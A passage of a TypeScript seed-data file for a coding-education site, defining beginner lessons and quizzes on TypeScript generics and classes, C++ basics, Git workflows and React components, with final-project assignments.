          prompt: "Which symbol combines types into a union?",
          options: ['&', '|', '+', '::'],
          answer: '|',
        },
      ],
    },
  },
  {
    title: 'Generics',
    content: lessonContent(
      'Generics',
      `**Generics** let you write a function or type once and have it work correctly with whatever type gets passed in, without losing type safety.\n\n\`\`\`ts\nfunction firstElement<T>(items: T[]): T | undefined {\n  return items[0];\n}\n\nconsole.log(firstElement([1, 2, 3]));        // inferred as number | undefined\nconsole.log(firstElement(['a', 'b', 'c']));   // inferred as string | undefined\n\ninterface Box<T> {\n  value: T;\n}\n\nconst numberBox: Box<number> = { value: 42 };\nconsole.log(numberBox.value);\n\`\`\`\n\nThink of \`<T>\` as a placeholder: "whatever type you give me, I'll give the same type back out." The compiler figures out \`T\` automatically from the argument you pass, and still catches mistakes, \`firstElement([1, 2, 3])[0].toUpperCase()\` would be a compile error because that element is a \`number\`, not a \`string\`.`
    ),
    quiz: {
      title: 'Generics Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'FILL_BLANK',
          prompt: 'A generic type parameter is conventionally named a single capital letter, most commonly ____.',
          options: [],
          answer: 'T',
        },
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What is the main benefit of using generics?',
          options: [
            'They disable type checking for flexibility',
            'They let you reuse code across types while staying type-safe',
            'They convert all types to any',
            'They are only usable with arrays',
          ],
          answer: 'They let you reuse code across types while staying type-safe',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'firstElement<string>(...) and firstElement<number>(...) can share the exact same function implementation.',
          options: ['True', 'False'],
          answer: 'True',
        },
      ],
    },
  },
  {
    title: 'Enums and Advanced Types',
    content: lessonContent(
      'Enums and Advanced Types',
      `## Enums\n\nAn \`enum\` gives a set of related constants readable names.\n\n\`\`\`ts\nenum Role {\n  Student = 'STUDENT',\n  Instructor = 'INSTRUCTOR',\n  Admin = 'ADMIN',\n}\n\nfunction permissions(role: Role): string[] {\n  switch (role) {\n    case Role.Admin:\n      return ['read', 'write', 'delete'];\n    case Role.Instructor:\n      return ['read', 'write'];\n    default:\n      return ['read'];\n  }\n}\n\nconsole.log(permissions(Role.Instructor));\n\`\`\`\n\n## Discriminated unions\n\nCombining a union type with a shared \"tag\" property lets TypeScript narrow which shape you're working with.\n\n\`\`\`ts\ntype ApiResult<T> = { ok: true; data: T } | { ok: false; error: string };\n\nfunction unwrap<T>(result: ApiResult<T>): T {\n  if (!result.ok) throw new Error(result.error);\n  return result.data; // TypeScript knows result is the { ok: true } branch here\n}\n\nconsole.log(unwrap({ ok: true, data: 42 }));\n\`\`\`\n\nThe \`ok\` property is the discriminant, checking it narrows \`result\` to exactly one branch of the union inside each \`if\`.`
    ),
    quiz: {
      title: 'Enums & Unions Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What kind of type is `{ ok: true; data: T } | { ok: false; error: string }`?',
          options: ['A generic constraint', 'A discriminated union', 'An enum', 'An intersection type'],
          answer: 'A discriminated union',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'The keyword used to define a set of named constants in TypeScript is ____.',
          options: [],
          answer: 'enum',
        },
        {
          type: 'TRUE_FALSE',
          prompt: "Checking a shared property like `result.ok` lets TypeScript narrow the type inside an if branch.",
          options: ['True', 'False'],
          answer: 'True',
        },
      ],
    },
  },
  {
    title: 'Classes and Access Modifiers',
    content: lessonContent(
      'Classes and Access Modifiers',
      `TypeScript classes add access modifiers on top of JavaScript classes to enforce encapsulation at compile time.\n\n\`\`\`ts\nclass Account {\n  private balance: number;\n  readonly owner: string;\n\n  constructor(owner: string, startingBalance = 0) {\n    this.owner = owner;\n    this.balance = startingBalance;\n  }\n\n  deposit(amount: number): number {\n    this.balance += amount;\n    return this.balance;\n  }\n\n  getBalance(): number {\n    return this.balance;\n  }\n}\n\nconst acct = new Account('Ada', 100);\nacct.deposit(50);\nconsole.log(acct.owner, acct.getBalance());\n\n// acct.balance ❌ the compiler rejects this before the code ever runs:\n// "Property 'balance' is private and only accessible within class 'Account'"\n\`\`\`\n\n## Modifiers\n\n| Modifier | Meaning |\n|----------|---------|\n| \`public\` (default) | Accessible from anywhere |\n| \`private\` | Only accessible inside the class itself |\n| \`readonly\` | Can be set once (usually in the constructor), never reassigned after |`
    ),
    quiz: {
      title: 'Classes Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What does marking a field `private` do?',
          options: [
            'Makes it read-only',
            'Prevents it from being accessed outside the class',
            'Makes it optional',
            'Turns it into a generic',
          ],
          answer: 'Prevents it from being accessed outside the class',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'A field marked ____ can be set once but never reassigned afterward.',
          options: [],
          answer: 'readonly',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'By default, class fields in TypeScript are public.',
          options: ['True', 'False'],
          answer: 'True',
        },
      ],
    },
  },
  {
    title: 'Final Project: Typed Task Tracker',
    content: lessonContent(
      'Final Project: Typed Task Tracker',
      `Time to combine interfaces, generics, unions, and classes into one typed program.\n\n## Requirements\n\n1. Define an interface (or type) describing a \`Task\`: \`id\`, \`title\`, \`done\`, and \`priority: 'low' | 'medium' | 'high'\`.\n2. Write a generic \`Store<T>\` class (or a set of typed functions) that can add, remove, and list items of any type, then use it to manage \`Task\` objects.\n3. Write a function that filters tasks by priority and returns a properly typed result.\n4. Model an "add task" operation as a discriminated union or use an \`enum\` somewhere meaningful, e.g. a result type that can succeed or fail validation.\n5. Make sure the whole file compiles with no implicit \`any\`s, add explicit types anywhere inference doesn't cover you.\n\n## Stretch goals\n\n- Sort tasks by priority.\n- Add a \`readonly createdAt\` field set in the constructor.\n- Split your types into a separate file and import them with \`import\`/\`export\`.\n\nSubmit your repository link below when you are done, an instructor will review it before you can mark this lesson complete. Good luck! 🚀`
    ),
    requiresSubmission: true,
  },
];

const cppLessons: SeedLesson[] = [
  {
    title: 'Hello, C++',
    content: lessonContent(
      'Hello, C++',
      `C++ is a **compiled**, statically-typed language, your source code is translated into machine code by a compiler before the program ever runs. That extra step is part of why C++ programs run so fast, and why "compile errors" catch many mistakes before you even try running anything. It's used everywhere performance matters: games and game engines, operating systems, embedded devices, and other high-performance software.\n\n## Your first program\n\n\`\`\`cpp\n#include <iostream>\n\nint main() {\n    std::cout << "Hello, Kodstigen!" << std::endl;\n    return 0;\n}\n\`\`\`\n\n## Reading it line by line\n\n- \`#include <iostream>\` pulls in the input/output library, without it \`std::cout\` wouldn't exist.\n- \`int main() { ... }\` is the **entry point**, every C++ program starts running here, and only here.\n- \`std::cout << "..."\` sends text to the console, \`std::\` means "this comes from the standard library", and \`<<\` pushes a value into the output stream.\n- \`std::endl\` ends the current line.\n- \`return 0;\` tells the operating system the program finished successfully, by convention \`0\` means "no errors" (anything else signals a problem).\n\n## Compiling and running\n\nUnlike Python or JavaScript, C++ code doesn't run directly, a compiler translates it into an executable first:\n\n\`\`\`bash\ng++ hello.cpp -o hello\n./hello\n\`\`\`\n\n\`g++ hello.cpp -o hello\` compiles \`hello.cpp\` into a program named \`hello\`, \`./hello\` then runs it.`
    ),
    quiz: {
      title: 'C++ Intro Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which function is the entry point of every C++ program?',
          options: ['start()', 'main()', 'init()', 'run()'],
          answer: 'main()',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'C++ source code must be compiled before it can run.',
          options: ['True', 'False'],
          answer: 'True',
        },
      ],
    },
  },
  {
    title: 'Variables and Memory',
    content: lessonContent(
      'Variables and Memory',
      `Every variable lives somewhere in your computer's memory, and C++ is unusual among popular languages in letting you work with that memory directly.\n\n## Declaring variables\n\n\`\`\`cpp\nint xp = 100;         // an integer variable holding the value 100\ndouble price = 9.99;  // a floating-point number\nchar grade = 'A';     // a single character\nbool passed = true;   // true or false\n\`\`\`\n\nEvery variable in C++ has a fixed **type** decided when it's declared, an \`int\` can never later hold a decimal or a piece of text.\n\n## Addresses, pointers, and references\n\nEvery variable lives at a specific **address** in memory, think of memory as a huge street of numbered houses, a variable's address is just its house number.\n\n\`\`\`cpp\nint xp = 100;\nstd::cout << &xp;      // prints xp's address, e.g. 0x7ffc3a2b1c\n\nint* ptr = &xp;        // ptr is a pointer: it stores xp's address\nstd::cout << *ptr;     // *ptr "dereferences" ptr: prints 100, the value at that address\n\nint& ref = xp;         // ref is a reference: another name for xp itself\nref = 200;             // this actually changes xp too!\nstd::cout << xp;       // prints 200\n\`\`\`\n\n| Symbol | Meaning | Example |\n|---|---|---|\n| \`&x\` | "address of x" | \`int* p = &x;\` |\n| \`*p\` | "the value at the address p points to" | \`std::cout << *p;\` |\n| \`T*\` | "a pointer to a T" | \`int* p;\` |\n| \`T&\` | "a reference to a T" | \`int& r = x;\` |\n\n## Pointers vs. references\n\n- A **pointer** is a variable that stores an address, it can be reassigned to point somewhere else, or set to \`nullptr\` to point at nothing at all.\n- A **reference** is an alias for an existing variable, it must be bound to something when it's created, and can never be changed to refer to something else afterward.\n\n> [!WARNING]\n> A pointer that still holds the address of something that's already been destroyed is called a **dangling pointer**, dereferencing it is undefined behavior, one of the most common sources of bugs in C++. Always be sure what a pointer points at is still alive before you dereference it.`
    ),
    quiz: {
      title: 'Memory Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'FILL_BLANK',
          prompt: 'The operator used to get the address of a variable is ____.',
          options: [],
          answer: '&',
        },
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What does dereferencing a pointer (*ptr) give you?',
          options: ['The address it stores', 'The value at the address it stores', 'A copy of the pointer', 'A compile error'],
          answer: 'The value at the address it stores',
        },
      ],
    },
  },
  {
    title: 'Control Flow and Loops',
    content: lessonContent(
      'Control Flow and Loops',
      `Programs need to make decisions and repeat work. C++'s control-flow keywords work a lot like other C-family languages (JavaScript, C#, Java), so what you learn here will transfer directly.\n\n\`\`\`cpp\n#include <iostream>\n\nint main() {\n    int xp = 45;\n\n    if (xp >= 50) {\n        std::cout << "Level up!" << std::endl;\n    } else {\n        std::cout << "Keep going, " << (50 - xp) << " XP to go." << std::endl;\n    }\n\n    for (int i = 1; i <= 5; i++) {\n        std::cout << "Lesson " << i << std::endl;\n    }\n\n    int count = 0;\n    while (count < 3) {\n        std::cout << "count = " << count << std::endl;\n        count++;\n    }\n\n    return 0;\n}\n\`\`\`\n\n## The pieces\n\n- \`if\` / \`else\` branches on a boolean condition, the condition must always be wrapped in parentheses.\n- \`for (init; condition; increment)\` runs the init once, then repeats: check condition, run the loop body, run the increment, check condition again, and so on. Best when you know how many times to loop.\n- \`while (condition)\` keeps looping as long as the condition stays true, checked before every iteration, useful when you don't know the number of iterations ahead of time.\n\n> [!TIP]\n> Forgetting to update the loop variable (like \`count++\`) is one of the most common beginner bugs, it creates an **infinite loop** that never becomes false.`
    ),
    quiz: {
      title: 'Control Flow Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which loop is the best fit when you know exactly how many iterations you need?',
          options: ['for', 'while', 'do', 'if'],
          answer: 'for',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'A while loop whose condition never becomes false is called an ____ loop.',
          options: [],
          answer: 'infinite',
        },
        {
          type: 'TRUE_FALSE',
          prompt: "In C++, the condition in an if statement must be wrapped in parentheses.",
          options: ['True', 'False'],
          answer: 'True',
        },
      ],
    },
  },
  {
    title: 'Functions',
    content: lessonContent(
      'Functions',
      `A **function** packages up a piece of logic so you can reuse it by name, instead of retyping the same code everywhere.\n\n\`\`\`cpp\n#include <iostream>\n#include <string>\n\nint add(int a, int b) {\n    return a + b;\n}\n\nvoid greet(const std::string& name) {\n    std::cout << "Hello, " << name << "!" << std::endl;\n}\n\nint main() {\n    std::cout << "add(2, 3) = " << add(2, 3) << std::endl;\n    greet("Kodstigen");\n    return 0;\n}\n\`\`\`\n\n## Key ideas\n\n- A function's declared return type (\`int\`, \`void\`, ...) must match what it actually returns, \`void\` means "returns nothing".\n- In \`add(int a, int b)\`, \`a\` and \`b\` are **parameters**, placeholders for whatever values get passed in when the function is called (the actual values, like \`2\` and \`3\`, are called **arguments**).\n- Passing a parameter as \`const std::string&\` passes it **by reference** instead of copying it, faster for large objects like strings, and \`const\` promises the function won't modify it.\n- Functions must generally be declared (or defined) before they're used, that's why \`add\` and \`greet\` appear above \`main\`.`
    ),
    quiz: {
      title: 'Functions Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What does a function declared with return type `void` return?',
          options: ['Nothing', 'Zero', 'A null pointer', 'An empty string'],
          answer: 'Nothing',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'Declaring a parameter as `const std::string&` avoids copying the argument by passing it by ____.',
          options: [],
          answer: 'reference',
        },
        {
          type: 'TRUE_FALSE',
          prompt: "A function's return type must match the type of value it actually returns.",
          options: ['True', 'False'],
          answer: 'True',
        },
      ],
    },
  },
  {
    title: 'Arrays and Vectors',
    content: lessonContent(
      'Arrays and Vectors',
      `Most programs need to work with collections of values, not just single variables. C++ gives you two main options: fixed-size arrays and resizable vectors.\n\n\`\`\`cpp\n#include <iostream>\n#include <vector>\n\nint main() {\n    int scores[3] = {80, 92, 67};   // fixed-size array\n    std::cout << "first score: " << scores[0] << std::endl;\n\n    std::vector<int> xp = {10, 20, 30};   // resizable array\n    xp.push_back(40);\n\n    int total = 0;\n    for (int value : xp) {\n        total += value;\n    }\n    std::cout << "total xp: " << total << std::endl;\n    std::cout << "vector size: " << xp.size() << std::endl;\n\n    return 0;\n}\n\`\`\`\n\n## Arrays vs. vectors\n\n- A plain array (\`int scores[3]\`) has a **fixed size** decided at compile time, it can never grow or shrink, and accessing an out-of-bounds index (like \`scores[5]\`) is undefined behavior, C++ won't stop you.\n- \`std::vector<T>\`, part of the Standard Template Library (STL), is a **resizable** array, \`push_back\` adds an element, \`size()\` tells you how many there are.\n- The range-based \`for (int value : xp)\` loop visits every element without needing an index, read it as "for each value in xp".\n\n> [!TIP]\n> When you're not sure how many elements you'll need, reach for \`std::vector\` by default, plain arrays are mostly useful when the size is small and fixed ahead of time.`
    ),
    quiz: {
      title: 'Arrays & Vectors Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What is the main advantage of std::vector over a plain fixed-size array?',
          options: [
            'It uses less memory always',
            'It can grow and shrink at runtime',
            'It is faster to access by index',
            'It cannot store integers',
          ],
          answer: 'It can grow and shrink at runtime',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'The method used to add an element to the end of a vector is ____().',
          options: [],
          answer: 'push_back',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'An array declared as `int scores[3]` can change size after it is created.',
          options: ['True', 'False'],
          answer: 'False',
        },
      ],
    },
  },
  {
    title: 'Final Project: Grade Calculator',
    content: lessonContent(
      'Final Project: Grade Calculator',
      `Time to combine control flow, functions, and vectors into one program.\n\n## Requirements\n\n1. Store a list of student scores using a \`std::vector<int>\`.\n2. Write a function that computes the average of the scores.\n3. Write a function that returns the highest and lowest score.\n4. Loop over the scores and print each one alongside a letter grade (A/B/C/D/F) based on thresholds you define.\n5. Print a final summary of the average, highest, and lowest scores using \`std::cout\`.\n\n## Stretch goals\n\n- Read scores from the user with \`std::cin\` instead of hardcoding them.\n- Use a \`struct\` to bundle a student's name together with their scores.\n- Split the logic into multiple small functions, each with one clear responsibility.\n\nSubmit your repository link below when you are done, an instructor will review it before you can mark this lesson complete. Good luck! 🚀`
    ),
    requiresSubmission: true,
  },
];

const gitLessons: SeedLesson[] = [
  {
    title: 'Introduction to Git',
    content: lessonContent(
      'Introduction to Git',
      `Git is a **distributed version control system**, it tracks every change to your code over time, lets you go back to any previous state, and makes it possible for multiple people to work on the same project without stepping on each other's changes.\n\n## Why use version control?\n\n- **History**, every commit is a snapshot you can return to.\n- **Branching**, try risky changes on a separate line of work without touching the working code.\n- **Collaboration**, merge everyone's work together instead of emailing zip files around.\n\n## Installing Git and setting your identity\n\nCheck whether Git is already installed:\n\n\`\`\`bash\ngit --version\n\`\`\`\n\nEvery commit is stamped with an author, so set your identity once per machine:\n\n\`\`\`bash\ngit config --global user.name "Your Name"\ngit config --global user.email "you@example.com"\n\`\`\`\n\n\`--global\` applies these settings to every repository on your machine, not just the current one.`
    ),
    quiz: {
      title: 'Git Basics',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What type of software is Git?',
          options: ['A programming language', 'A distributed version control system', 'A cloud hosting service', 'A text editor'],
          answer: 'A distributed version control system',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Git and GitHub are the same thing.',
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'The command to set your Git username globally is: git config --global user.____',
          options: [],
          answer: 'name',
        },
      ],
    },
  },
  {
    title: 'Your First Repository',
    content: lessonContent(
      'Your First Repository',
      `A Git **repository** ("repo") is a project folder Git is tracking. Let's create one.\n\n## Initializing a repository\n\n\`\`\`bash\nmkdir my-project\ncd my-project\ngit init\n\`\`\`\n\n\`git init\` creates a hidden \`.git\` folder, that's where Git stores the entire history of your project.\n\n## The three states of a file\n\n| State | Meaning |\n|-------|---------|\n| Untracked / Modified | Changed on disk, not yet staged |\n| Staged | Marked to be included in the next commit |\n| Committed | Saved permanently in the project's history |\n\n\`\`\`bash\ngit status                   # see what's changed\ngit add app.js                # stage a specific file\ngit add .                     # stage everything\ngit commit -m "Add app.js"    # save the staged changes\n\`\`\`\n\n## Viewing history\n\n\`\`\`bash\ngit log\ngit log --oneline    # one line per commit, easier to scan\n\`\`\`\n\n> [!TIP]\n> Commit often, in small, focused chunks. "Add login form" is a much more useful commit message than "stuff".`
    ),
    quiz: {
      title: 'First Repository Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which command turns a folder into a Git repository?',
          options: ['git start', 'git init', 'git create', 'git new'],
          answer: 'git init',
        },
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which command moves changes into the staging area?',
          options: ['git stage', 'git add', 'git track', 'git save'],
          answer: 'git add',
        },
        {
          type: 'TRUE_FALSE',
          prompt: "git commit saves your staged changes to the project's permanent history.",
          options: ['True', 'False'],
          answer: 'True',
        },
      ],
    },
  },
  {
    title: 'Branching and Merging',
    content: lessonContent(
      'Branching and Merging',
      `A **branch** is an independent line of development. The default branch is usually called \`main\`.\n\n## Creating and switching branches\n\n\`\`\`bash\ngit branch feature-login        # create a branch\ngit switch feature-login         # switch to it\n\n# or do both in one step:\ngit switch -c feature-login\n\`\`\`\n\nOlder tutorials use \`git checkout -b feature-login\`, it does the same thing as \`git switch -c\`.\n\n## Merging\n\nOnce your branch is ready, merge it back into \`main\`:\n\n\`\`\`bash\ngit switch main\ngit merge feature-login\n\`\`\`\n\n## Merge conflicts\n\nIf the same lines were changed on both branches, Git can't automatically decide which version to keep, that's a **merge conflict**. Git marks the conflicting lines directly in the file:\n\n\`\`\`\n<<<<<<< HEAD\nconst greeting = "Hello!";\n=======\nconst greeting = "Hi there!";\n>>>>>>> feature-login\n\`\`\`\n\nEdit the file to keep the version you want, remove the \`<<<<<<<\`/\`=======\`/\`>>>>>>>\` markers, then stage and commit as usual.\n\n> [!WARNING]\n> Always pull the latest changes before starting new work, resolving a conflict is much easier when it's small.`
    ),
    quiz: {
      title: 'Branching Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which command creates and switches to a new branch in one step?',
          options: ['git branch new', 'git switch -c new', 'git merge new', 'git commit new'],
          answer: 'git switch -c new',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'Combining changes from one branch into another is called a ____.',
          options: [],
          answer: 'merge',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'A merge conflict happens when Git can automatically combine changes without any help.',
          options: ['True', 'False'],
          answer: 'False',
        },
      ],
    },
  },
  {
    title: 'Remotes: Push, Pull, and Clone',
    content: lessonContent(
      'Remotes: Push, Pull, and Clone',
      `So far everything has lived only on your machine. A **remote** is a copy of your repository hosted somewhere else, usually GitHub, GitLab, or Bitbucket.\n\n## Connecting a remote\n\nCreate an empty repository on GitHub, then connect it to your local project:\n\n\`\`\`bash\ngit remote add origin https://github.com/you/my-project.git\ngit push -u origin main\n\`\`\`\n\n\`-u\` (short for \`--set-upstream\`) links your local \`main\` branch to \`origin/main\`, so future pushes only need:\n\n\`\`\`bash\ngit push\n\`\`\`\n\n## Getting changes from a remote\n\n\`\`\`bash\ngit pull     # fetch + merge in one step\ngit fetch    # download changes without merging yet\n\`\`\`\n\n## Cloning an existing project\n\nTo get a full copy of someone else's repository:\n\n\`\`\`bash\ngit clone https://github.com/them/their-project.git\n\`\`\`\n\n> [!NOTE]\n> \`origin\` is just a nickname, the default one Git suggests, but you can name a remote anything.`
    ),
    quiz: {
      title: 'Remotes Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which command uploads your local commits to a remote repository?',
          options: ['git push', 'git pull', 'git fetch', 'git clone'],
          answer: 'git push',
        },
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which command downloads a full copy of an existing remote repository?',
          options: ['git pull', 'git clone', 'git init', 'git remote'],
          answer: 'git clone',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'The default name Git suggests for your primary remote is ____.',
          options: [],
          answer: 'origin',
        },
      ],
    },
  },
  {
    title: 'Final Project: Publish Your Own Repo',
    content: lessonContent(
      'Final Project: Publish Your Own Repo',
      `Time to put it all together.\n\n## Requirements\n\n1. Create a new project folder locally, anything you like, a script, a small app, whatever you want to practice on.\n2. Run \`git init\` and make at least 3 separate commits as you build it.\n3. Create a new empty repository on GitHub (or GitLab/Bitbucket).\n4. Connect your local repo to it and push your commits.\n5. Create at least one additional branch, make a change on it, and merge it back into \`main\`.\n\n## Stretch goals\n\n- Add a \`.gitignore\` file for files that shouldn't be tracked (e.g. \`node_modules/\`).\n- Write a proper \`README.md\` describing your project.\n- Open a pull request on your own repo and merge it from the GitHub UI instead of the command line.\n\nSubmit your repository link below when you are done, an instructor will review it before you can mark this lesson complete. Good luck! 🚀`
    ),
    requiresSubmission: true,
  },
];

const reactLessons: SeedLesson[] = [
  {
    title: 'Introduction to React and JSX',
    content: lessonContent(
      'Introduction to React and JSX',
      `React is a JavaScript library for building user interfaces out of small, reusable **components**. Instead of manually updating the page, you describe what the UI should look like for a given state, and React handles the updates.\n\n## Your first component\n\nA component is just a JavaScript function that returns **JSX**, an HTML-like syntax that compiles down to regular JavaScript.\n\n\`\`\`\nfunction Welcome() {\n  return <h1>Hello, Kodstigen!</h1>;\n}\n\`\`\`\n\n*JSX needs a React app (and a build step) to render, so it's read-only here, every example in this course uses this style, you'll run real components in the final project.*\n\n## Embedding JavaScript in JSX\n\nCurly braces \`{ }\` let you drop any JavaScript expression into your markup:\n\n\`\`\`\nfunction Greeting() {\n  const name = 'Ada';\n  return <h1>Hello, {name}!</h1>;\n}\n\`\`\`\n\n## One rule to remember\n\nA component must return a **single root element**. To return multiple sibling elements without adding an extra \`<div>\`, wrap them in a Fragment: \`<>...</>\`.`
    ),
    quiz: {
      title: 'React Basics Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What does JSX let you write directly inside JavaScript?',
          options: ['SQL queries', 'HTML-like markup', 'CSS stylesheets', 'YAML config'],
          answer: 'HTML-like markup',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'A React component is just a JavaScript ____ that returns JSX.',
          options: [],
          answer: 'function',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'A component can return multiple sibling elements without wrapping them in a single parent element or Fragment.',
          options: ['True', 'False'],
          answer: 'False',
        },
      ],
    },
  },
  {
    title: 'Props and Component Composition',
    content: lessonContent(
      'Props and Component Composition',
      `**Props** (short for properties) are how a parent component passes data down to a child component, they work a lot like function arguments.\n\n\`\`\`\nfunction Badge({ label, color }) {\n  return <span style={{ color }}>{label}</span>;\n}\n\nfunction Profile() {\n  return (\n    <div>\n      <Badge label="Instructor" color="blue" />\n      <Badge label="5-star" color="gold" />\n    </div>\n  );\n}\n\`\`\`\n\n## Key rules\n\n- Props are **read-only**, a component should never modify the props it receives, if it needs to change over time, that's what state (next lesson) is for.\n- Destructuring props in the function signature, \`function Badge({ label, color })\`, is the idiomatic way to read them.\n- The special \`children\` prop holds whatever JSX is nested between a component's opening and closing tags, letting you build flexible wrapper components like \`<Card>...</Card>\`.\n\n**Composition** is the practice of building complex UIs out of small components like \`Badge\`, plugged into bigger ones like \`Profile\`.`
    ),
    quiz: {
      title: 'Props Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'How does a parent component pass data down to a child component?',
          options: ['Global variables', 'Via props', 'Direct DOM manipulation', 'Environment variables'],
          answer: 'Via props',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'A component is allowed to modify (mutate) the props it receives.',
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'FILL_BLANK',
          prompt: "The special prop that holds JSX nested between a component's opening and closing tags is called ____.",
          options: [],
          answer: 'children',
        },
      ],
    },
  },
  {
    title: 'State and Event Handling',
    content: lessonContent(
      'State and Event Handling',
      `Props let data flow in from a parent, **state** lets a component remember and update its own data over time. The \`useState\` hook is how you add state to a function component.\n\n\`\`\`\nimport { useState } from 'react';\n\nfunction Counter() {\n  const [count, setCount] = useState(0);\n\n  return (\n    <button onClick={() => setCount(count + 1)}>\n      Clicked {count} times\n    </button>\n  );\n}\n\`\`\`\n\n## How it works\n\n- \`useState(0)\` returns a pair, the **current value** (\`count\`) and a **setter function** (\`setCount\`), starting at \`0\`.\n- Calling \`setCount(...)\` tells React the value changed, React then **re-renders** the component with the new value.\n- \`onClick={() => setCount(count + 1)}\` attaches an event handler, the same pattern works for \`onChange\`, \`onSubmit\`, and every other DOM event.\n\n> [!WARNING]\n> Never mutate state directly (\`count++\` or \`count = count + 1\`), always go through the setter, or React won't know to re-render.`
    ),
    quiz: {
      title: 'State Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What does useState(0) return?',
          options: [
            'Just the current value',
            'An array with the current value and a setter function',
            'A Promise that resolves to the value',
            'Nothing, it only has a side effect',
          ],
          answer: 'An array with the current value and a setter function',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'Calling the setter function returned by useState triggers a component ____.',
          options: [],
          answer: 're-render',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'You should mutate a state variable directly instead of calling its setter function.',
          options: ['True', 'False'],
          answer: 'False',
        },
      ],
    },
  },
  {
    title: 'Effects and Side Effects',
    content: lessonContent(
      'Effects and Side Effects',
      `Rendering should stay pure, no fetching, no timers, no subscriptions. The \`useEffect\` hook is where that kind of **side effect** belongs.\n\n\`\`\`\nimport { useState, useEffect } from 'react';\n\nfunction CourseList() {\n  const [courses, setCourses] = useState([]);\n\n  useEffect(() => {\n    fetch('/api/courses')\n      .then((res) => res.json())\n      .then(setCourses);\n  }, []); // empty array: run once, when the component mounts\n\n  return (\n    <ul>\n      {courses.map((c) => <li key={c.id}>{c.title}</li>)}\n    </ul>\n  );\n}\n\`\`\`\n\n## The dependency array\n\nThe second argument to \`useEffect\` controls **when** it re-runs:\n\n| Dependency array | Behavior |\n|---|---|\n| omitted | Runs after every render |\n| \`[]\` | Runs once, after the first render |\n| \`[someValue]\` | Runs once after the first render, then again whenever \`someValue\` changes |\n\n## Cleaning up\n\nIf your effect subscribes to something (a timer, a WebSocket, an event listener), return a **cleanup function** from it, React calls it before the effect re-runs and when the component unmounts:\n\n\`\`\`\nuseEffect(() => {\n  const id = setInterval(() => console.log('tick'), 1000);\n  return () => clearInterval(id);\n}, []);\n\`\`\``
    ),
    quiz: {
      title: 'Effects Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What does an empty dependency array `[]` mean for useEffect?',
          options: [
            'The effect never runs',
            'The effect runs once, when the component mounts',
            'The effect runs on every render',
            'The effect only runs on unmount',
          ],
          answer: 'The effect runs once, when the component mounts',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'To fetch data when a component first renders, you would use the ____ hook.',
          options: [],
          answer: 'useEffect',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'A function returned from inside useEffect is used to clean up before the next run or on unmount.',
          options: ['True', 'False'],
          answer: 'True',
        },
      ],
    },
  },
  {
    title: 'Rendering Lists and Building Forms',
    content: lessonContent(
      'Rendering Lists and Building Forms',
      `## Rendering lists\n\nUse \`.map()\` to turn an array of data into an array of JSX elements, each one needs a unique \`key\` prop so React can track it across re-renders.\n\n\`\`\`\nfunction TaskList({ tasks }) {\n  return (\n    <ul>\n      {tasks.map((task) => (\n        <li key={task.id}>{task.text}</li>\n      ))}\n    </ul>\n  );\n}\n\`\`\`\n\n> [!WARNING]\n> Prefer a stable id for \`key\`, using the array index breaks when items are reordered, inserted, or removed, React can confuse which item is which.\n\n## Controlled forms\n\nA **controlled input** gets its displayed value from state, and updates that state on every keystroke:\n\n\`\`\`\nfunction TaskForm({ onAdd }) {\n  const [text, setText] = useState('');\n\n  function handleSubmit(event) {\n    event.preventDefault();\n    onAdd(text);\n    setText('');\n  }\n\n  return (\n    <form onSubmit={handleSubmit}>\n      <input value={text} onChange={(e) => setText(e.target.value)} />\n      <button type="submit">Add</button>\n    </form>\n  );\n}\n\`\`\`\n\n\`event.preventDefault()\` stops the browser's default full-page reload on form submit, letting React handle it instead.`
    ),
    quiz: {
      title: 'Lists & Forms Quiz',
      passingScore: 70,
      questions: [
        {
